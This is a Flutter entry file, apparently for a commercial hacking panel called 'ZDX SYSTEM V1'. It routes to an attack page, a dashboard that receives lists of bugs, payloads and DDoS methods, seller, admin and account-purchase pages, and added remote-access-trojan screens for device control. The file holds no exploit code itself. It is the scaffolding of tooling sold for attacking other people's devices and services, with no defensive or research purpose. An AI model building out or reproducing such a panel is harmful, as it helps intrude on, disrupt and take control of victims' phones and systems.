import 'package:flutter/material.dart';
import 'landing_page.dart'; 
import 'login_page.dart';
import 'loader_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'admin_page.dart';
import 'buy_account.dart';
import 'splash.dart'; 

// --- PENAMBAHAN IMPORT BARU (TANPA MENGHAPUS) ---
import 'login_rat_page.dart';
import 'device_dashboard.dart';
import 'control_panel.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'ZDX SYSTEM V1',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono', // Font andalan
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(
          primary: Colors.redAccent,
          secondary: Colors.purple,
        ),
        // Membuat tampilan AppBar konsisten di seluruh aplikasi
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.black,
          elevation: 0,
          centerTitle: true,
        ),
      ),
      initialRoute: '/',
      onGenerateRoute: (settings) {
        // Ambil arguments sekali di sini agar lebih rapi
        final args = settings.arguments as Map<String, dynamic>?;

        switch (settings.name) {
          case '/':
            return MaterialPageRoute(builder: (_) => const LandingPage());

          case '/login':
            return MaterialPageRoute(builder: (_) => const LoginPage());

          case '/splash':
            return MaterialPageRoute(
              builder: (_) => SplashPage(data: args ?? {}),
            );

          case '/buy_account':
            return MaterialPageRoute(builder: (_) => const BuyAccountPage());

          case '/loader':
            return MaterialPageRoute(
              builder: (_) => DashboardPage(
                username: args?['username'] ?? '',
                password: args?['password'] ?? '',
                role: args?['role'] ?? 'member',
                sessionKey: args?['key'] ?? '',
                expiredDate: args?['expiredDate'] ?? '',
                listBug: List<Map<String, dynamic>>.from(args?['listBug'] ?? []),
                listPayload: List<Map<String, dynamic>>.from(args?['listPayload'] ?? []),
                listDDoS: List<Map<String, dynamic>>.from(args?['listDDoS'] ?? []),
                news: List<Map<String, dynamic>>.from(args?['news'] ?? []),
              ),
            );

          case '/attack':
            return MaterialPageRoute(
              builder: (_) => AttackPage(
                username: args?['username'] ?? '',
                password: args?['password'] ?? '',
                listBug: List<Map<String, dynamic>>.from(args?['listBug'] ?? []),
                role: args?['role'] ?? '',
                expiredDate: args?['expiredDate'] ?? '',
                sessionKey: args?['sessionKey'] ?? '',
              ),
            );

          case '/seller':
            return MaterialPageRoute(
              builder: (_) => SellerPage(keyToken: args?['keyToken'] ?? ''),
            );

          case '/admin':
            return MaterialPageRoute(
              builder: (_) => AdminPage(sessionKey: args?['sessionKey'] ?? ''),
            );

          // --- PENAMBAHAN RUTE FITUR RAT (TANPA MENGHAPUS) ---
          case '/login_rat':
            return MaterialPageRoute(builder: (_) => const LoginRatPage());

          case '/dashboard_rat':
            return MaterialPageRoute(builder: (_) => const DeviceDashboardPage());

          case '/control_panel':
            return MaterialPageRoute(builder: (_) => const ControlCenterPage());

          default:
            return MaterialPageRoute(
              builder: (_) => const Scaffold(
                body: Center(child: Text("404 - PANEL NOT FOUND", style: TextStyle(color: Colors.red))),
              ),
            );
        }
      },
    );
  }
}